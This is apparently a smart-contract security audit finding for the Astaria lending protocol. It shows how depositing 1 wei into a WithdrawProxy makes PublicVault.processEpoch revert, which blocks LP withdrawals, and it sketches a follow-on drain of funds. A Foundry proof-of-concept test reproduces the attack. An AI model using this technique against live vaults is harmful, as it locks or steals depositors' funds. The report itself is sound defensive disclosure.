rvierdiiev

high

# Possible to fully block PublicVault.processEpoch function. No one will be able to receive their funds

## Summary
Possible to fully block `PublicVault.processEpoch` function. No one will be able to receive their funds
## Vulnerability Detail
When liquidity providers want to redeem their share from `PublicVault` they call `redeemFutureEpoch` function which will create new `WithdrawProxy` for the epoch(if not created already) and then mint shares for redeemer in `WithdrawProxy`. PublicVault [transfer](https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/PublicVault.sol#L190) user's shares to himself.

https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/PublicVault.sol#L178-L212
```solidity
  function redeemFutureEpoch(
    uint256 shares,
    address receiver,
    address owner,
    uint64 epoch
  ) public virtual returns (uint256 assets) {
    // check to ensure that the requested epoch is not the current epoch or in the past
    require(epoch >= currentEpoch, "Exit epoch too low");


    require(msg.sender == owner, "Only the owner can redeem");
    // check for rounding error since we round down in previewRedeem.


    ERC20(address(this)).safeTransferFrom(owner, address(this), shares);


    // Deploy WithdrawProxy if no WithdrawProxy exists for the specified epoch
    _deployWithdrawProxyIfNotDeployed(epoch);


    emit Withdraw(msg.sender, receiver, owner, assets, shares);


    // WithdrawProxy shares are minted 1:1 with PublicVault shares
    WithdrawProxy(withdrawProxies[epoch]).mint(receiver, shares); // was withdrawProxies[withdrawEpoch]
  }
```

This function mints `WithdrawProxy` shares 1:1 to redeemed `PublicVault` shares.
Then later after call of `processEpoch` and `transferWithdrawReserve` the funds will be sent to the WithdrawProxy and users can now redeem their shares from it.

Function `processEpoch` decides how many funds should be sent to the `WithdrawProxy`.

https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/PublicVault.sol#L268-L289
```solidity
    if (withdrawProxies[currentEpoch] != address(0)) {
      uint256 proxySupply = WithdrawProxy(withdrawProxies[currentEpoch])
        .totalSupply();


      liquidationWithdrawRatio = proxySupply.mulDivDown(1e18, totalSupply());


      if (liquidationAccountants[currentEpoch] != address(0)) {
        LiquidationAccountant(liquidationAccountants[currentEpoch])
          .setWithdrawRatio(liquidationWithdrawRatio);
      }


      uint256 withdrawAssets = convertToAssets(proxySupply);
      // compute the withdrawReserve
      uint256 withdrawLiquidations = liquidationsExpectedAtBoundary[
        currentEpoch
      ].mulDivDown(liquidationWithdrawRatio, 1e18);
      withdrawReserve = withdrawAssets - withdrawLiquidations;
      // burn the tokens of the LPs withdrawing
      _burn(address(this), proxySupply);


      _decreaseYIntercept(withdrawAssets);
    }
```

This is how it is decided how much money should be sent to WithdrawProxy.
Firstly, we look at totalSupply of WithdrawProxy. 
`uint256 proxySupply = WithdrawProxy(withdrawProxies[currentEpoch]).totalSupply();`.

And then we convert them to assets amount.
`uint256 withdrawAssets = convertToAssets(proxySupply);`

In the end function burns `proxySupply` amount of shares controlled by PublicVault.
` _burn(address(this), proxySupply);`

Then this amount is allowed to be sent(if no auctions currently, but this is not important right now).

This all allows to attacker to make `WithdrawProxy.deposit` to mint new shares for him and increase totalSupply of WithdrawProxy, so `proxySupply` becomes more then was sent to `PublicVault`.

This is attack scenario.

1.PublicVault is created and funded with 50 ethers.
2.Someone calls `redeemFutureEpoch` function to create new WithdrawProxy for next epoch.
3.Attacker sends 1 wei to WithdrawProxy to make totalAssets be > 0. Attacker deposit to WithdrawProxy 1 wei. Now WithdrawProxy.totalSupply > PublicVault.balanceOf(PublicVault).
4.Someone call `processEpoch` and it reverts on burning.

As result, nothing will be send to WithdrawProxy where shares were minted for users. The just lost money.

Also this attack can be improved to drain users funds to attacker. 
Attacker should be liquidity provider. And he can initiate next redeem for next epoch, then deposit to new WithdrawProxy enough amount to get new shares. And call `processEpoch` which will send to the vault amount, that was not sent to previous attacked WithdrawProxy, as well. So attacker will take those funds.
## Impact
Funds of PublicVault depositors are stolen.
## Code Snippet
This is simple test that shows how external actor can corrupt WithdrawProxy.

```solidity
function testWithdrawProxyDdos() public {
    Dummy721 nft = new Dummy721();
    address tokenContract = address(nft);
    uint256 tokenId = uint256(1);

    address publicVault = _createPublicVault({
      strategist: strategistOne,
      delegate: strategistTwo,
      epochLength: 14 days
    });

    _lendToVault(
      Lender({addr: address(1), amountToLend: 50 ether}),
      publicVault
    );

    uint256 collateralId = tokenContract.computeId(tokenId);

    uint256 vaultTokenBalance = IERC20(publicVault).balanceOf(address(1));
    console.log("balance: ", vaultTokenBalance);

    // _signalWithdrawAtFutureEpoch(address(1), publicVault, uint64(1));
    _signalWithdraw(address(1), publicVault);

    address withdrawProxy = PublicVault(publicVault).withdrawProxies(
      PublicVault(publicVault).getCurrentEpoch()
    );

    vm.deal(address(2), 2);
    vm.startPrank(address(2));
      WETH9.deposit{value: 2}();
      //this we need to make share calculation not fail with divide by 0
      WETH9.transferFrom(address(2), withdrawProxy, 1);
      WETH9.approve(withdrawProxy, 1);
      
      //deposit 1 wei to make WithdrawProxy.totalSupply > PublicVault.balanceOf(address(PublicVault))
      //so processEpoch can't burn more shares
      WithdrawProxy(withdrawProxy).deposit(1, address(2));
    vm.stopPrank();

    assertEq(vaultTokenBalance, IERC20(withdrawProxy).balanceOf(address(1)));

    vm.warp(block.timestamp + 15 days);

    //processEpoch fails, because it can't burn more amount of shares, that was sent to PublicVault
    vm.expectRevert();
    PublicVault(publicVault).processEpoch();
  }
```
## Tool used

Manual Review

## Recommendation
Make function WithdrawProxy.deposit not callable.